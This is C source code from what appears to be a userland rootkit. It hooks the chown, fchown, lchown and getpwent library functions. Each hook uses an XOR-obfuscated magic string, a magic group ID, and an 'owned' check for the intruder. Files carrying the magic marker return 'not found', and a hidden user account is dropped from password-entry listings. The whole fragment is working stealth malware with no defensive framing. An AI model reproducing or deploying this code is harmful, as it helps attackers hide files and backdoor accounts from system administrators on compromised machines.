int chown(const char *pathname, uid_t owner, gid_t group)
{ 
	HOOK(chown); 
	HOOK(__lxstat);
	#ifdef DEBUG 
	printf("[rk] chown hooked\n"); 
	#endif 

	if (owned()) return old_chown(pathname, owner, group); 
	struct stat filestat; 
	old___lxstat(_STAT_VER, pathname, &filestat);
	char *magic = strdup(MAGIC); xor(magic); 
	if ((strstr(pathname, magic) != NULL) || filestat.st_gid == MAGICGID)
	{ 
		CLEAN(magic);
		errno = ENOENT; 
		return -1; 
	}
	CLEAN(magic);
	return old_chown(pathname, owner, group);
}	

int fchown(int fd, uid_t owner, gid_t group)
{ 
	HOOK(fchown); 
	HOOK(fstat); 
	#ifdef DEBUG 
	printf("[rk] fchown hooked\n"); 
	#endif 

	if (owned()) return old_fchown(fd, owner, group); 
	char *magic = strdup(MAGIC); xor(magic);
	struct stat filestat; 
	old_fstat(fd, &filestat); 
	if (filestat.st_gid == MAGICGID)
	{ 
		CLEAN(magic);
		errno = ENOENT; 
		return -1; 
	}
	CLEAN(magic);
	return old_fchown(fd, owner, group); 
}

int lchown(const char *pathname, uid_t owner, gid_t group)
{ 
	HOOK(lchown); 
	HOOK(__xstat); 
	#ifdef DEBUG 
	printf("[rk] lchown hooked\n"); 
	#endif 

	if (owned()) return old_lchown(pathname, owner, group); 
	char *magic = strdup(MAGIC); xor(magic); 
	struct stat filestat; 
	old___xstat(_STAT_VER, pathname, &filestat); 
	if ((strstr(pathname, magic) != NULL) || filestat.st_gid == MAGICGID)
	{ 
		 CLEAN(magic);
		 errno = ENOENT; 
		 return -1; 
	} 
	CLEAN(magic);
	return old_lchown(pathname, owner, group); 
}

struct passwd *getpwent(void)
{ 
	HOOK(getpwent); 
	#ifdef DEBUG 
	printf("[rk] getpwent hooked\n"); 
	#endif

	struct passwd *pw = old_getpwent(); 
	if (owned()) return old_getpwent(); 
	char *user = strdup(USER); xor(user); 
	if (strcmp(pw->pw_name, user) == 0)
	{ 
		CLEAN(user); 
		errno = ESRCH; //not here!!!
		return NULL; 
	}
       	CLEAN(user);	
	return pw; 
}


